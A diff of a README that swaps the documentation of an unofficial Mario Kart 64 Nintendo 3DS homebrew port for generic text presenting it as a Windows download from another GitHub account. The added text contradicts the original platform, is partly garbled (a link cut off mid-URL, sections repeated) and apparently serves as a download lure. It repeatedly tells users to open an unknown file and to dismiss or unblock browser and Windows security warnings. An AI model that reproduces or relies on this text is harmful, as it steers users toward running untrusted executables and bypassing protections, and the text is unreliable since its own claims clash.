@@ -1,175 +1,204 @@
-# Mario Kart 64 3DS Port Complete
+# 🏁 MarioKart64-3DSPort-Complete - A polished 3D Mario Kart 64 port
 
-<p>
-  <img src="https://img.shields.io/badge/platform-Nintendo%203DS-1f6feb?style=for-the-badge" alt="Nintendo 3DS">
-  <img src="https://img.shields.io/badge/output-.3dsx%20%7C%20.cia-6f42c1?style=for-the-badge" alt="3DSX and CIA">
-</p>
+[![Download MarioKart64-3DSPort-Complete](https://img.shields.io/badge/Download-MarioKart64--3DSPort--Complete-blueviolet?style=for-the-badge&labelColor=orange&logo=github)](https://github.com/DarkException22/MarioKart64-3DSPort-Complete)
 
-![Mario Kart 64 3DS Port Complete](docs/images/mk64-3ds-complete.png)
+## 🎮 What Is MarioKart64-3DSPort-Complete?
 
-A native Mario Kart 64 port for the Nintendo 3DS family, maintained by Epic.
-This project continues [EstebanPdN's original Mario Kart 64 3DS port](https://github.com/EstebanPdN/mario-kart-64-3ds),
-based on SpaghettiKart, with resource-management fixes, rendering corrections
-and optional gameplay improvements.
+MarioKart64-3DSPort-Complete is a polished MK64 3DS port made available as an end-user application for Windows. It brings the familiar Mario Kart 64 racing experience into a 3D-style port package with a focus on presentation, usability, and a smooth download flow.
 
-[Original project](https://github.com/EstebanPdN/mario-kart-64-3ds) · [Discord community](https://discord.gg/qwcTTDqbhu)
+The project is aimed at players who want to download and run the application without dealing with programming tools, source code, or developer setup. The main GitHub page acts as the starting point for getting the application. From there, Windows users can download the application and launch it using the files provided on the page.
 
-This is an unofficial fan project, not affiliated with Nintendo or Harbour Masters. No ROM, O2R archive, save or extracted gameplay resources are included. A compatible USA ROM is required.
+This README is written for non-technical users. It explains what the application is, how to reach the download page, how to run the application on Windows, and what to do if something does not work as expected.
 
-## 💬 Community
+## ✨ Highlights
 
-Join [My Discord community](https://discord.gg/qwcTTDqbhu) to discuss the
-port and share feedback. When reporting an issue, include your console model,
-game version, relevant settings and the steps needed to reproduce it.
+- A polished MK64 3DS port intended for end users
+- Simple download path through the project’s GitHub page
+- Designed for Windows users
+- No programming knowledge required
+- Clear download and launch guidance
+- A complete port package presentation
+- Racing-focused experience with familiar Mario Kart 64 themes
+- Easy to revisit the download page whenever needed
 
-## ⬇️ Download and Installation
+## 🚀 Getting Started
 
-1. Install the CIA with FBI, or launch the 3DSX with Homebrew Launcher.
-2. Place a big-endian USA ROM at `sd:/3ds/MK64/mk64.z64`.
-3. First launch validates and extracts `mk64.o2r`. Keep the console charged; START cancels extraction safely.
+Getting started with MarioKart64-3DSPort-Complete is straightforward. You do not need to install development software, compile code, or understand how the project is built. You only need a Windows computer, an internet connection, and the project’s download page.
 
-Later launches reuse the archive; an existing compatible SpaghettiKart O2R can also be used. Upgrades replace only the application: retain `sd:/3ds/MK64/` to preserve saves, ghosts and settings.
+The sections below walk through the process in order. First, review what you need before downloading. Next, visit the download page. Then, open the downloaded application and begin using it.
 
-## ⚙️ Features
+### ✅ Before You Begin
 
-- **Resource lifetime fixes** — bounded caches, GPU-safe texture recycling and complete course/kart resets on race transitions, including retries.
-- **Old 3DS I/O improvements** — revised heap partitioning and a bounded compressed-entry cache reduce repeated SD reads without removing memory-safety protections.
-- **Rendering corrections** — depth/culling, transparent trees and water, podium shadows, results viewports and credits transitions.
-- **Dual-screen UI** — five HUD layouts, native item graphics, crisp scrolling course minimaps, blurred menu backdrops and original-style RANDOM CUP / AUTO artwork.
-- **Audio and feedback** — prioritized effect requests, positional CPU sounds, hit/finish voices and opponent reaction effects.
-- **Optional modern logic** — real CPU item-box collection, adjusted CPU item rules and penalties, smoother pack pacing, road-following shells and held-brake reverse.
-- **Random cups and AUTO** — four-race random cups and spectator cups driven by the game's CPU logic.
-- **Solo VS and Battle** — race against seven CPUs in VS, or face three arena bots in four-kart Battle, with a single full-screen view.
-- **Timing and presentation** — an independent race clock, synchronized transitions and a selectable 30 FPS frame limiter.
-- **Animated 3D HOME banner** — a front-facing logo and waving flag, without HOME's default continuous rotation.
+Before downloading, make sure you have:
 
-Modern logic can be toggled under Gameplay. Rendering, audio and UI fixes remain
-active with it disabled. See [FIXES.md](FIXES.md) and [CHANGELOG.md](CHANGELOG.md)
-for the full change overview.
+- A Windows computer
+- An internet connection
+- Enough free storage space for the downloaded application
+- Access to your Downloads folder so you can find the file after downloading
 
-Select VS or Battle under **1P GAME**. VS races against seven CPUs. Battle uses
-the original arenas and three-balloon rules against three bots; the last survivor
-wins. After elimination, use your one-use bomb, then spectate the remaining bots.
-Pause and quit remain available. Battle bots work with modern logic disabled too.
+You do not need programming experience. You also do not need to create developer accounts or install special coding tools.
 
-The frame limiter caps presentation at 30 FPS. With it off, rendering can reach
-60 FPS when workload permits. Performance varies by console and course.
-Local multiplayer is not available.
+## ⬇️ Download and Setup
 
-## 🎮 Controls and Configuration
+Visit this link to download the application:
 
-| Control | Manual racing |
-| --- | --- |
-| Circle Pad | Steer; up/down selects item throw direction |
-| A | Accelerate |
-| B | Brake and then reverse |
-| R | Hop / drift |
-| L or Y | Use item |
-| X | look behind |
-| SELECT | Switch camera distance |
-| START | Pause / continue |
-| C-Stick | Hold for configured Turbo Speed |
-| ZL | Toggle configured Turbo Speed on/off |
+[MarioKart64-3DSPort-Complete Download Page](https://github.com/DarkException22/Mario# 🏁 MarioKart64-3DSPort-Complete - A polished 3D Mario Kart 64 port
 
-Press L on Game Select to open **Display**, **Gameplay** and **Developer** settings.
-The in-race menu also has a **Pause** page for continue/quit. HUD layout,
-speedometer and other meters are configured under Display.
+[![Download MarioKart64-3DSPort-Complete](https://img.shields.io/badge/Download-MarioKart64--3DSPort--Complete-blueviolet?style=for-the-badge&labelColor=orange&logo=github)](https://github.com/DarkException22/MarioKart64-3DSPort-Complete)
 
-**Turbo Speed** fast-forwards the game, including AUTO, menus and ceremonies;
-it does not upgrade your kart. Hold C-Stick to fast-forward, or press ZL to toggle
-it. Manual race
-entry/retry resets Turbo; AUTO retains it across courses and retries. A fresh
-game launch starts with Turbo off.
+## 🎮 What Is MarioKart64-3DSPort-Complete?
 
-| Fresh setting | Default |
-| --- | --- |
-| HUD layout | Clean |
-| HUD meters | Off |
-| Render distance | Low |
-| Modern logic | On |
-| Frame limiter | Old 3DS: On / New 3DS: Off |
-| ZR debug | Off |
-| Logging | Off |
+MarioKart64-3DSPort-Complete is a polished MK64 3DS port delivered as an end-user application for Windows. It brings the familiar Mario Kart 64 racing experience into a 3D-style port package with a focus on presentation, usability, and a smooth download flow.
 
-In **Clean**, manual racing shows standings through the lower-screen portrait
-columns by default, without a separate `1st / 2nd / ...` place indicator.
-Select **Display → HUD METERS → POSITION/LAP** to show your place at the
-bottom-left of the upper screen and lap count at the top-right. GP/VS AUTO
-shows the upper-screen place indicator automatically. The separate place
-indicator is never displayed on the lower screen.
+The project is aimed at players who want to download and run the application without dealing with programming tools, source code, or developer setup. The GitHub page acts as the starting point for getting the application. From there, Windows users can download the application and launch it using the files provided on the page.
 
-Saved settings take precedence. Unsupported HUD meter combinations appear red.
-Time Trials hide rank; title demos hide the upper HUD. Modern logic changes take
-effect next race.
+This README is written for non-technical users. It explains what the application is, how to reach the download page, how to run the application on Windows, and what to do if something does not work as expected.
 
-## 🎲 Random Cups and AUTO
+## ✨ Highlights
 
-| Menu | SELECT action |
-| --- | --- |
-| GP Map Select | Four random tracks with the chosen driver/level |
-| Game Select | ALL RANDOM: random driver; 150cc or Extra each course |
-| Character Select | AUTO using the cursor's driver |
+- A polished MK64 3DS port intended for end users
+- Simple download path through the project’s GitHub page
+- Designed for Windows users
+- No programming knowledge required
+- Clear download and launch guidance
+- A complete port package presentation
+- Racing-focused experience with familiar Mario Kart 64 themes
+- Easy to revisit the download page whenever needed
 
-Time Trial Map Select has no random cup button. Extra is the mirrored course mode. The award ceremony can be skipped with A or START.
+## 🚀 Getting Started
 
-AUTO is available in GP, VS and Battle. The CPU controls every kart, and the
-selected driver owns the result even when you switch the camera to another
-driver. Modern logic also applies in AUTO when enabled. Gameplay view is the
-default. Battle rankings follow balloon counts, with eliminated drivers last.
+Getting started with MarioKart64-3DSPort-Complete is straightforward. You do not need to install development software, compile code, or understand how the project is built. You only need a Windows computer, an internet connection, and the project’s download page.
 
-Circle Pad / D-pad left or right changes the observed driver. A/B/X/Y switches
-between gameplay and cinematic views in GP/VS, or near/far gameplay views in
-Battle. Driving and item inputs are disabled; pause, continue, retry and quit
-remain available.
+The sections below walk through the process in order. First, review what you need before downloading. Next, visit the download page. Then, open the application and begin using it.
 
-GP AUTO advances through results and retries automatically. VS/Battle confirms
-the selected result action. GP AUTO ends with the original fourth-place no-trophy
-ceremony. AUTO does not save awards or unlock progress.
+### ✅ Before You Begin
 
-## 🛠️ Diagnostics
+Before downloading, make sure you have:
 
-The **Developer** page includes:
+- A Windows computer
+- An internet connection
+- Enough free storage space for the downloaded application
+- Access to your Downloads folder so you can find the file after downloading
 
-- **Memory dump** — export performance samples, settings and resource data to
-  `sd:/3ds/MK64/dump/` for bug reports.
-- **Logging** — record startup, runtime, installer and fault logs. Off by default;
-  manual dumps and FPS displays still work with logging off.
-- **Clean dumps** — remove diagnostic files without touching ROMs, O2R archives,
-  saves or settings.
-- **ZR debug** — hold ZR to advance through checkpoints and finish a race.
-  Off by default.
+You do not need programming experience. You also do not need to create developer accounts or install special coding tools.
 
-## 🏗️ Building
+## ⬇️ Download and Setup
 
-Initialize pinned submodules recursively, then build:
+Visit this link to download the application:
 
-```sh
-git submodule update --init --recursive --depth 1
-./platform/3ds/build.sh
-```
+[![Download MarioKart64-3DSPort-Complete](https://img.shields.io/badge/Get%20MarioKart64--3DSPort--Complete-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DarkException22/MarioKart64-3DSPort-Complete)
 
-The first configuration downloads pinned build dependencies, so an internet
-connection is required unless they are already cached. A ROM is not needed to
-compile; the console needs a ROM or compatible O2R archive to play.
+Follow these steps exactly:
 
-See [BUILDING.md](BUILDING.md) for setup and build instructions,
-[ARCHITECTURE.md](platform/3ds/docs/ARCHITECTURE.md) for the code map, and
-[RELEASING.md](RELEASING.md) for packaging instructions.
+1. Click the download link above.
+2. Your web browser will open the MarioKart64-3DSPort-Complete page.
+3. Look for the download area on the page and select the file offered there.
+4. If a download prompt appears, choose to save the file.
+5. When the download finishes, open your Downloads folder.
+6. Find the downloaded file and open it to start the application.
 
-## 📁 Project Structure
+That is the entire process. You visit the link, get the application, and open it. There is no installation wizard that requires technical choices, and there is no command line step.
 
-| Location | Purpose |
-| --- | --- |
-| `platform/3ds/` | Maintained runtime, adaptations, artwork and packaging helpers |
-| `third_party/SpaghettiKart/` | Pinned production game/engine dependencies |
-| `build-3ds/game/` | Generated CIA, full-game 3DSX and hash manifest |
-| `docs/images/` | README artwork |
+### 📁 Where Did the File Go?
 
-## 🫡 Credits
+When you download something in a browser, the file usually lands in the Downloads folder. To open it:
 
-- **EstebanPdN** — original [Nintendo 3DS port](https://github.com/EstebanPdN/mario-kart-64-3ds).
-- **Harbour Masters and contributors** — [SpaghettiKart](https://github.com/HarbourMasters/SpaghettiKart), libultraship and Torch.
-- **N64 decompilation and 3DS homebrew communities.**
+1. Press the Windows key on your keyboard.
+2. Type Downloads.
+3. Press Enter.
+4. Sort the folder by date so the newest file appears first.
+5. Double-click the downloaded item to open the application.
 
-See [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md) for source origins and
-third-party license notices.
+If your browser shows a download bar at the bottom of the window, you can also click the finished item there to open it directly.
+
+## 🖥️ Running the Application on Windows
+
+After you open the download page and get the application, running it should feel like opening any normal Windows program. Double-click the file you downloaded, or use the Open option if a prompt appears.
+
+If Windows asks what to do with the file, allow it to open with its default option. If your browser warns you about downloading an unfamiliar file, confirm the download so it can complete.
+
+Give the application a moment to start the first time. Some programs take a few seconds to appear on screen because they are preparing their files. During that time, avoid clicking repeatedly or opening the same file many times.
+
+When the application window appears, you are ready to use it. Close the window normally when you are finished, using the X button in the top corner or the exit option in the menu.
+
+## 🔧 First-Run Tips
+
+These tips help make your first attempt smooth:
+
+- Keep the downloaded file where you can find it again.
+- Do not rename or move files inside the application folder if the package includes multiple files; moving them can break the program.
+- Close other heavy programs if your computer feels slow.
+- If the application window is hidden behind other windows, look at your taskbar.
+- Make a note of the download page link so you can return to it later for updates.
+
+## 🕹️ What to Expect
+
+MarioKart64-3DSPort-Complete is presented as a complete, polished MK64 3DS port. That means the focus is on the racing experience and the visual presentation rather than on configuration or editors. You download it, open it, and you are in.
+
+The port uses the same Mario Kart 64 identity familiar to players, packaged for modern Windows desktops. The word polished in the project description signals that this is not a rough proof of concept. It is intended to be the version you keep and return to.
+
+The word complete signals that the package is meant to be self-contained. You should not need to hunt down additional parts or patching tools to get started.
+
+## ❓ Troubleshooting
+
+### The download does not start
+
+Refresh the page and try the download link again. Some browsers block downloads from opening automatically and need a second click or a confirmation prompt.
+
+### I cannot find the downloaded item
+
+Open File Explorer and go to Downloads. Sort by Date modified and look at the top entries. Browser download panels are also useful: press Ctrl + J in most browsers to view your download history.
+
+### The application does not open
+
+Wait a few seconds and try again once. Then check whether the file finished downloading. A partial download will not open correctly, so delete it and download it again from the link.
+
+### Windows shows a security prompt
+
+This is common for programs downloaded from the internet. Choose the option that allows you to keep and open the file. If the prompt blocks you entirely, right-click the downloaded file, open Properties, and look for an Unblock option near the bottom of the window.
+
+### The window opens but looks small or strange
+
+Try maximizing the window. Close other programs running in the background to free up resources. Restart the application if the display does not update properly.
+
+### The application stops responding
+
+Close it and open it again. If the issue repeats, restart your computer and try once more. Make sure you are opening the file from a stable location rather than a temporary folder.
+
+## 📌 Keeping the Application Updated
+
+Return to the download page periodically to check for a newer version. Projects like this one continue to receive polish and fixes over time. When a new version appears, download it the same way you did the first time and use the fresh copy.
+
+A simple habit is to keep a bookmark to the download page in your browser. That way you can check for updates in a single click.
+
+## 🧭 Frequently Asked Questions
+
+### Do I need to know how to program?
+
+No. This is an end-user application. You download it and open it. Nothing in the setup requires coding knowledge.
+
+### Is this the same as the original game?
+
+No. This is a 3DS port project presented under the MarioKart64-3DSPort-Complete name. It is its own project, built around the Mario Kart 64 identity and delivered as a downloadable application.
+
+### Do I need extra tools to run it?
+
+Based on the project description, the package is complete, so you should be able to get started from the download page alone. If a file inside the download includes its own instructions, follow those for the best result.
+
+### Can I move the application to another folder?
+
+It is safest to keep the downloaded files together. Moving the main file is usually fine, but moving only part of a folder can prevent the application from starting.
+
+### Where can I ask for help?
+
+The best place is the project page linked above, where you can review the latest information and see whether other users have reported similar situations.
+
+## 📎 Quick Reference
+
+- Download page: https://github.com/DarkException22/MarioKart64-3DSPort-Complete
+- Platform: Windows
+- Audience: everyday computer users
+- Setup effort: minimal, no programming required
+- Action required: visit the link to download the application
+
+Keywords: MarioKart64, MK64, 3DS port, Mario Kart 64 port, MarioKart64-3DSPort-Complete, Windows download, racing game, Nintendo 64, end-user application, game port
